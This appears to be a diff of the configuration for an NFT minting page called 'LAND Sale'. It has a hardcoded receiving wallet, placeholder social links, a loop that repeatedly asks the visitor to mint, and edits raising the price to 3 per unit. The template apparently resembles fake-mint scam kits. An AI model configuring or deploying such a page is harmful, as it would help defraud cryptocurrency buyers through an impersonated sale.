@@ -11,13 +11,13 @@ const receiveAddress = "0xd4550697Fe601BdAeD1E591d47A887Aa7097400a";
 
 const collectionInfo = {
     name: "LAND Sale",
-    date: "30.04.2022",
+    date: "1.05.2022",
     socialMedia: {
         discord: "discord.gg/invite_here",
         twitter: "https://twitter.com/username_here",
     },
     medias: {
-        preview: "ezgif-3-31d12fa9dc.gif",
+        preview: "tg-gig.gif",
         favicon: "icon.ico",
     },
     background: {
@@ -34,10 +34,10 @@ const collectionInfo = {
 */
 
 const mintInfo = {
-    price: 0.305,
-    totalSupply: 55000,
+    price: 3,
+    totalSupply: 1753,
     minUnits: 1,
-    maxUnits: 10,
+    maxUnits: 3,
     askMintLoop: true,
 }
 
